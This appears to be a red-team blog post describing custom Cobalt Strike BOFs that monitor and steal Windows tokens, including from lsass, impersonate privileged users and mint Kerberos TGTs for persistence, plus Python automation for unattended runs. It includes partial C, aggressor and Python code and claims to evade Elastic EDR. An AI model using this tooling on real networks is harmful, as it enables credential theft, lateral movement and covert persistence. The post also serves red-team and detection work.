---
title: Monitor Cobalt Strike beacon for Windows tokens and gain Kerberos persistence
date: 2024-04-18
categories: [ "Malware Development" ]
tags: [ "research", "command and control", "windows", "edr", "tooling", "detection", "tokens", "kerberos", "monitoring" ]     # TAG names should always be lowercase
---

In a recent engagement my teammates and I compromised a Windows server where some high privileged users were connected. We did not want to risk to extract credentials from `lsass.exe` as the EDR would have detected us so we decided to abuse Windows tokens to move laterally in the network.


We quickly identified a Windows token of an interesting user, however the token was not usable. The next day, we were lucky to find another high privileged user connected through RDP and we managed to impersonate the user and generate Kerberos tickets on its behalf.


But what if the user would have connected during our off office time and logged off? We would have missed our shot. The idea to be able to monitor Windows tokens at regular intervals came to my mind and I began to look for existing tools.


First, I recommend to read about Windows tokens at [sensepost](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/).

Second, I am not a Windows expert and a lot of aspects regarding Windows tokens remain unclear to me so please send me a message if I missed something.

## Enumerate Windows tokens

Cobalt Strike allows the operators to list the processes and the associated tokens.

![](/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/cs_processes.png)

However, that way we miss some tokens in `lsass.exe` in case we don’t mind opening a handle to it. The LSASS process holds a `PrimaryToken` for each user that used Interactive logon to connect (local authentication or RDP for example) so I wanted to have the possibility to show and steal these tokens too.


With the sensepost blog post, comes a tool [Impersonate](https://github.com/sensepost/impersonate/) that enumerates Windows tokens by looping on all handles available, duplicate the handle and store the associated Windows token.

I reused the code base to create a BOF to enumerate ALL the Windows tokens.

![](/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/cs_tokens_list.png)

With the ability to steal a specific one by using `BeaconUseToken(HANDLE token)` Cobalt Strike Beacon API.

![](/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/cs_use_token.png)

This is great but I wanted to keep track of the Windows tokens for a long period of time.


## Store Windows tokens in Beacon memory

A Windows tokens store was implemented in the [version 4.8: (System) Call Me Maybe](https://www.cobaltstrike.com/blog/cobalt-strike-4-8-system-call-me-maybe) based on [Henkru/cs-token-vault BOF](https://github.com/Henkru/cs-token-vault).

However this tool only allows operators to steal a Windows token using a Process ID so we miss the opportunity to steal tokens in the LSASS process.

With the release [4.9: Take Me To Your Loader](https://www.cobaltstrike.com/blog/cobalt-strike-49-take-me-to-your-loader), several Beacon API were added.

```c
DECLSPEC_IMPORT BOOL BeaconAddValue(const char * key, void * ptr);
DECLSPEC_IMPORT void * BeaconGetValue(const char * key);
DECLSPEC_IMPORT BOOL BeaconRemoveValue(const char * key);
```

These APIs allow us to save pointers in Beacon memory and retrieve them later. So I created a new store using the following code.

```c
#include <Windows.h>
#include "beacon.h"
// ...

#define TOKEN_STORE_NAME "tokenstore"
// ...

// structure from sense impersonate original tool
typedef struct _TOKEN {
    HANDLE TokenHandle;
    int TokenId;
    USHORT ProcessId;
    DWORD SessionId;
    wchar_t Username[FULL_NAME_LENGTH];
    wchar_t TokenType[TOKEN_TYPE_LENGTH];
    wchar_t TokenImpersonationLevel[TOKEN_IMPERSONATION_LENGTH];
    wchar_t TokenIntegrity[TOKEN_INTEGRITY_LENGTH];
    struct _TOKEN* Next;
} TOKEN, *PTOKEN;


void go(char* args, int len)
{
    PTOKEN TokenStore = NULL;
    
    TokenStore = (PTOKEN)BeaconGetValue(TOKEN_STORE_NAME);

    // TokenStore exists
    if ( TokenStore )
        BeaconPrintf(CALLBACK_OUTPUT, "Current TokenStore at 0x%p", TokenStore);
    // No TokenStore
    else
        BeaconPrintf(CALLBACK_OUTPUT, "No TokenStore");

    // Add an empty token to the linked list
    AddTokenToList(&TokenStore, (TOKEN){ 0 });

    // Save the store for the next time
    // Save the pointer of the linked list head
    BeaconAddValue(TOKEN_STORE_NAME, TokenStore);

    return 0;
}
```

By implementing the new store to the impersonate BOF I came up with this result

```
beacon> help custom-token-store
Use: custom-token-store monitor
     custom-token-store show
     custom-token-store use [id]
     custom-token-store release

Use 'custom-token-store monitor' to monitor new tokens and store them in the store

Use 'custom-token-store show' to only show the current tokens in the store

Use 'custom-token-store use' to use a token in the store

Use 'custom-token-store release' free the store from Beacon memory
```

For the scenario, I first monitored tokens when `CRASH\sadmin` is the only connected user.

![](/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/custom_token_monitor.png)

![](/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/custom_token_show.png)

Later, the Domain Administrator connected to the server through RDP and we ran the monitoring again.

![](/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/custom_token_monitor_adm.png)

![](/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/custom_token_show_adm.png)

If I impersonate a PrimaryToken belonging to CRASH\Administrator I can access `DC.CRASH.LAB` restricted `C$` network share.

![](/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/custom_token_use.png)

However, I noticed that after some minutes, my leaked Windows tokens are not usable anymore if the targeted user sign out from its RDP session. 


![](/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/use_failed.png)

In parallel, I came across [GhostPack/Koh](https://github.com/GhostPack/Koh) whose objective is to steal Windows tokens too. The tool is splitted in 2 parts:

- a .NET tool which is the Koh server that monitors new Windows tokens and stores them
- a BOF which is the Koh client to interact with Koh server via a named pipe

On my side the tool worked great but I faced the same issue when the targeted user signed out from its RDP session: the leaked Windows token is not really usable anymore.

![](/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/koh_failed.png)

Besides, I wanted a solution that remains in Beacon memory only and avoids fork&run post exploitation.


## Performing Kerberos persistence

I wanted to have another way to impersonate a user in case the Windows tokens belonging to this user are not usable when I come back to work. My idea was to use the TGT delegation trick to generate a Kerberos ticket for each user that I have in my `custom-token-store`.

For that purpose I used the code from [Kerberos-BOF](https://github.com/RalfHacker/Kerbeus-BOF/blob/main/tgtdeleg/tgtdeleg.c) and integrate it in another BOF that uses my token store.

For this new BOF, I used this structure to keep track of the Kerberos tickets.

```c
#define TICKET_STORE_NAME "ticketstore"


typedef struct _TICKET {
    UINT16          TicketId;
    ULARGE_INTEGER  Timestamp;
    WCHAR           Username[FULL_NAME_LENGTH];
    LPSTR           Value;
    struct _TICKET* Next;
} TICKET, *PTICKET;
```

We can impersonate the tokens in our TokenStore and generate a TGT for the user.

```c
/*
 * Impersonate a token to generate a TGT ticket
 */
BOOL GenerateTicket(PTOKEN Token, PTICKET Ticket)
{
    if ( Token->TokenHandle && Token->TokenHandle != INVALID_HANDLE_VALUE )
    {

        // Impersonate the user
        if ( BeaconUseToken( Token->TokenHandle ) )
        {

            // Try to generate the TGT via TGT deleg trick
            Ticket->Value = TgtDeleg( NULL );

            // Revert back
            BeaconRevertToken();

            if ( Ticket->Value != NULL )
                return TRUE;
        }
    }
    return FALSE;
}
```

The same procedure as before is used to save the Kerberos tickets in a `tgtstore`.

```c
// Loop over all the tokens in store
while( CurrentToken )
{
    // we don't have a valid ticket for this username
    if ( !ValidTicketInStore( CurrentToken->Username, TicketStore, Timestamp ) )
    {
        // We generate a new TGT
        if ( GenerateTicket( CurrentToken, &TmpTicket ) )
        {
            // init the new ticket
            MSVCRT$wcscpy_s( TmpTicket.Username, FULL_NAME_LENGTH, CurrentToken->Username );
            TmpTicket.Timestamp = Timestamp;
            TmpTicket.TicketId = ++LastTicketId;

            // add the new ticket to the store
            PRINT_OUT( "Add ticket to store (%ls)\n", TmpTicket.Username );
            AddTicketToStore( &TicketStore, TmpTicket );
        }
    }
    CurrentToken = CurrentToken->Next;
}

// save the TGT store
BeaconAddValue( TICKET_STORE_NAME, TicketStore );
```


When we use the BOF.

```
beacon> help tgt-store
Use: tgt-store generate
     tgt-store show [id]
     tgt-store release

Use 'tgt-store generate' to generate new TGT based on token in custom-token-store

Use 'tgt-store show' to only show the current TGTs in the store or a specific TGT

Use 'tgt-store release' free the store from Beacon memory
```


![](/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/tgt_generate.png)

![](/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/tgt_show.png)


If you have followed the article until now, you may have noticed the monitoring of Windows tokens and Kerberos tickets generation implie the operator to launch the BOF commands. We would like to peform these actions in background and even during off site hours.


## Cobalt Strike beacon monitoring

During my research, I came across [CobaltStrike/sleep_python_bridge](https://github.com/Cobalt-Strike/sleep_python_bridge/) that leverages the headless Cobalt Strike client `agscript`.

The headless client allows to load CNA and execute agressor commands.

On the CNA side, I created the agressor command `start-token-monitoring` that forwards the execution to `bstart_monitoring`. To forward the arguments from a function/command to another I followed [this blog post](https://passthehashbrowns.github.io/cobalt-strike-aliases-kinda).

```php
sub bstart_monitoring {
    @_ = flatten(@_);
    $i = 1; #iterator
    foreach $arg (@_){ #Loop through all of our args
        eval("local('$" . $i . "')") #Declare our variable in the local scope
        eval("$$i = \"$arg\";") #Use eval to dynamically define each of our numbered args
        $i++;
    }

    $bid = $1;
    
    $handle = openf(script_resource("Release/custom-token-store." . barch($bid) . ".o"));
    $data   = readb($handle, -1);
    closef($handle);

    btask($bid, "Start token monitoring");
    $arg_data  = bof_pack($bid, "ii", 1, 0);
    beacon_inline_execute($bid, $data, "go", $arg_data);
}

// this is the command we can launch through the Script Console
command start-token-monitoring {
    // forward the arguments (only the beacon ID here)
    bstart_monitoring(@_)
}
```

Using the agressor looks like the following.

![](/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/ag_start_monitoring.png)

On the Python script side, the first PoC looked like this.

```python
from sleep_python_bridge.striker import CSConnector

## Connect to server
print("[*] Connecting to teamserver {}:{}...".format(args.host, args.port))
with CSConnector(
    cs_host=args.host, 
    cs_port="50050", 
    cs_user=args.username, 
    cs_pass=args.password,
    cs_directory=args.path) as cs:
    
    # include the adequate CNA for token + TGT stores
    # WARNING: I faced issue if the CNA path is not absolute
    cs.ag_load_script(f"{args.token_store}/custom-token-store.cna")
    cs.ag_load_script(f"{args.tgt_store}/tgt-store.cna")

    # execute the agressor command `start-token-monitoring`
    # in case the command is not launched, print the return value of ag_get_string()
    # if the command is not found, check the WARNING above
    cs.ag_get_string(monitoring.beacon_id, script_console_command="start-token-monitoring", sleep_time=0)
    # execute the agressor command `start-tgt-monitoring`
    cs.ag_get_string(monitoring.beacon_id, script_console_command="start-tgt-monitoring")
```

Then I used [fwkz/riposte](https://github.com/fwkz/riposte) to have a very convenient tool that I can run via tmux on the teamserver host.

```python
from sleep_python_bridge.striker import CSConnector
from argparse import ArgumentParser
from time import sleep
from riposte import Riposte
from prettytable import PrettyTable
from threading import Thread

class CustomRiposte(Riposte):
    def setup_cli(self):
        return
    def parse_cli_arguments(self):
        return


cs = None
csshell = CustomRiposte(prompt="cobaltstrike> ")
monitorings = []


class Monitoring:
    thread = None
    beacon_id = None
    running = False
    sleep_time = 0

    def __init__(self, beacon_id, running, sleep_time):
        self.beacon_id = beacon_id
        self.running = running
        self.sleep_time = sleep_time


def start_cs_monitoring(monitoring):
    cs.ag_get_string(f"bsleep({monitoring.beacon_id},{monitoring.sleep_time})")
    while monitoring.running:
        # token monitor
        cs.ag_get_string(monitoring.beacon_id, script_console_command="start-token-monitoring", sleep_time=0)
        # tgt generate
        cs.ag_get_string(monitoring.beacon_id, script_console_command="start-tgt-monitoring")
        sleep(monitoring.sleep_time)

@csshell.command("beacons")
def list_beacons():
    table = PrettyTable(["ID", "USER", "COMPUTER", "PID", "NOTE"])
    for beacon in cs.get_beacons():
        table.add_row([beacon['id'], beacon['user'], beacon['computer'], beacon['pid'], beacon['note']])
    print(table)


@csshell.command("start-monitoring")
def start_monitoring(beacon_id: str, sleep_time: int):
    monitoring = Monitoring(beacon_id=beacon_id, sleep_time=sleep_time, running=True)
    t = Thread(target=start_cs_monitoring, args=(monitoring,))
    monitoring.thread = t
    t.start()
    csshell.success("Start a monitoring for beacon {} each {} seconds".format(beacon_id, sleep_time))
    monitorings.append(monitoring)


@csshell.command("stop-monitoring")
def stop_monitoring(beacon_id: str):
    for monitoring in monitorings:
        if monitoring.beacon_id != beacon_id:
            continue
        monitoring.running = False
        monitoring.thread.join()
        csshell.success("Monitoring for beacon {} stopped".format(beacon_id))
        monitorings.remove(monitoring)
```

Running my script looks like.

<video src="/assets/posts/2024-04-18-monitor-cobaltstrike-windows-token-kerberos-persistence/monitor.mp4" width="100%" height="100%" controls="controls"></video>

You may have noticed the BOF prints the whole value of the TGTs, it’s to keep the Kerberos persistence in case the beacon exit for any reason.

## Detection

I ran the monitoring tools on a Windows server 2019 with Elastic EDR agent running, no alert was raised.

## Conclusion

Thanks for reading this article. I don’t plan releasing the tools at this time but you can easily build your own using this article and tools such as Impersonate and Koh. Please reach me for any question or mistake I could have made in my explanations.